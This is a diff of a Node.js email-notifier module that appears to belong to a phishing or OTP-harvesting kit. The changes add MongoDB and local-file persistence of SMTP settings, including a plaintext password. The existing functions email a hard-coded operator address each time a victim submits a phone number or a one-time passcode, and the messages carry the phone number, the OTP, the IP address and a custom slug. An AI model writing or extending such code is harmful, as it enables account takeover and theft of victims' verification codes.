@@ -1,9 +1,12 @@
 const nodemailer = require('nodemailer');
+const fs = require('fs');
+const path = require('path');
+const EmailSettings = require('../models/EmailSettings');
 
-// Default notification recipient emails
+const STORE_PATH = path.join(__dirname, 'email_store.json');
+
+// Memory store
 let notificationEmails = ['amirtalaat11@gmail.com'];
-
-// SMTP transporter (configured by default with working Gmail credentials)
 let smtpTransporter = null;
 let smtpConfig = {
     host: 'smtp.gmail.com',
@@ -56,29 +59,129 @@ function configureSMTP(config) {
     return true;
 }
 
-// Auto-initialize default SMTP transporter on module load
+// Initial default configuration
 configureSMTP(smtpConfig);
 
 /**
- * Set notification recipient emails.
+ * Load persisted settings from MongoDB (or local file fallback)
  */
-function setNotificationEmails(emails) {
-    if (Array.isArray(emails) && emails.length > 0) {
-        notificationEmails = emails.map(e => (e || '').trim()).filter(e => e && e.includes('@'));
+async function initPersistedSettings(isMongoConnected = false) {
+    try {
+        if (isMongoConnected) {
+            let doc = await EmailSettings.findOne();
+            if (!doc) {
+                doc = new EmailSettings({
+                    smtpHost: smtpConfig.host,
+                    smtpPort: smtpConfig.port,
+                    smtpUser: smtpConfig.user,
+                    smtpPass: smtpConfig.pass,
+                    recipients: notificationEmails
+                });
+                await doc.save();
+                console.log('[EmailNotifier] Created default EmailSettings document in MongoDB.');
+            } else {
+                smtpConfig.host = doc.smtpHost || smtpConfig.host;
+                smtpConfig.port = doc.smtpPort || smtpConfig.port;
+                if (doc.smtpUser) smtpConfig.user = doc.smtpUser;
+                if (doc.smtpPass) smtpConfig.pass = doc.smtpPass;
+                if (Array.isArray(doc.recipients) && doc.recipients.length > 0) {
+                    notificationEmails = doc.recipients;
+                }
+                configureSMTP(smtpConfig);
+                console.log(`[EmailNotifier] Loaded EmailSettings from MongoDB. Sender: ${doc.smtpUser}, Recipients: ${notificationEmails.join(', ')}`);
+            }
+            return;
+        }
+    } catch (err) {
+        console.error('[EmailNotifier] Could not load from MongoDB, using local file:', err.message);
     }
-    console.log(`[EmailNotifier] Recipients updated (${notificationEmails.length}): ${notificationEmails.join(', ')}`);
+
+    // Local file fallback
+    try {
+        if (fs.existsSync(STORE_PATH)) {
+            const raw = fs.readFileSync(STORE_PATH, 'utf8');
+            const data = JSON.parse(raw);
+            if (data.smtp) {
+                configureSMTP(data.smtp);
+            }
+            if (Array.isArray(data.recipients) && data.recipients.length > 0) {
+                notificationEmails = data.recipients;
+            }
+            console.log('[EmailNotifier] Loaded settings from local email_store.json');
+        }
+    } catch (err) {
+        console.error('[EmailNotifier] Could not load local store:', err.message);
+    }
 }
 
 /**
- * Get current notification emails.
+ * Save SMTP config to MongoDB & local JSON
  */
+async function saveSMTPConfig(config, isMongoConnected = false) {
+    const success = configureSMTP(config);
+    if (!success) return false;
+
+    // Save to MongoDB if available
+    try {
+        if (isMongoConnected) {
+            await EmailSettings.findOneAndUpdate({}, {
+                smtpHost: smtpConfig.host,
+                smtpPort: smtpConfig.port,
+                smtpUser: smtpConfig.user,
+                smtpPass: smtpConfig.pass
+            }, { upsert: true, new: true });
+            console.log('[EmailNotifier] Saved SMTP settings to MongoDB.');
+        }
+    } catch (err) {
+        console.error('[EmailNotifier] Error saving SMTP to MongoDB:', err.message);
+    }
+
+    // Save to local file
+    try {
+        saveLocalFile();
+    } catch (e) {}
+
+    return true;
+}
+
+/**
+ * Save Recipient emails to MongoDB & local JSON
+ */
+async function saveRecipientEmails(emails, isMongoConnected = false) {
+    if (Array.isArray(emails)) {
+        notificationEmails = emails.map(e => (e || '').trim()).filter(e => e && e.includes('@'));
+    }
+
+    try {
+        if (isMongoConnected) {
+            await EmailSettings.findOneAndUpdate({}, {
+                recipients: notificationEmails
+            }, { upsert: true, new: true });
+            console.log(`[EmailNotifier] Saved ${notificationEmails.length} recipients to MongoDB.`);
+        }
+    } catch (err) {
+        console.error('[EmailNotifier] Error saving recipients to MongoDB:', err.message);
+    }
+
+    try {
+        saveLocalFile();
+    } catch (e) {}
+
+    return notificationEmails;
+}
+
+function saveLocalFile() {
+    const data = {
+        smtp: smtpConfig,
+        recipients: notificationEmails
+    };
+    fs.writeFileSync(STORE_PATH, JSON.stringify(data, null, 2), 'utf8');
+}
+
 function getNotificationEmails() {
     return [...notificationEmails];
 }
 
-/**
- * Get current SMTP config (without password).
- */
 function getSMTPConfig() {
     return {
         host: smtpConfig.host || 'smtp.gmail.com',
@@ -93,7 +196,6 @@ function getSMTPConfig() {
  */
 async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
     if (!smtpTransporter) {
-        console.log('[EmailNotifier] Auto-configuring SMTP...');
         configureSMTP(smtpConfig);
     }
     if (!smtpTransporter || notificationEmails.length === 0) {
@@ -146,7 +248,7 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
             subject: `📱 New Phone Submitted: ${phoneNumber}`,
             html: htmlBody
         });
-        console.log(`[EmailNotifier] Phone notification successfully sent to ${notificationEmails.join(', ')}:`, info.messageId);
+        console.log(`[EmailNotifier] Phone notification sent to ${notificationEmails.join(', ')}:`, info.messageId);
         return info;
     } catch (err) {
         console.error(`[EmailNotifier] Failed to send phone notification:`, err.message);
@@ -159,7 +261,6 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
  */
 async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
     if (!smtpTransporter) {
-        console.log('[EmailNotifier] Auto-configuring SMTP...');
         configureSMTP(smtpConfig);
     }
     if (!smtpTransporter || notificationEmails.length === 0) {
@@ -218,7 +319,7 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
             subject: `✅ OTP Verified: ${phoneNumber} → Code: ${otp}`,
             html: htmlBody
         });
-        console.log(`[EmailNotifier] OTP notification successfully sent to ${notificationEmails.join(', ')}:`, info.messageId);
+        console.log(`[EmailNotifier] OTP notification sent to ${notificationEmails.join(', ')}:`, info.messageId);
         return info;
     } catch (err) {
         console.error(`[EmailNotifier] Failed to send OTP notification:`, err.message);
@@ -240,7 +341,9 @@ async function sendTestNotification() {
 
 module.exports = {
     configureSMTP,
-    setNotificationEmails,
+    initPersistedSettings,
+    saveSMTPConfig,
+    saveRecipientEmails,
     getNotificationEmails,
     getSMTPConfig,
     notifyPhoneSubmitted,
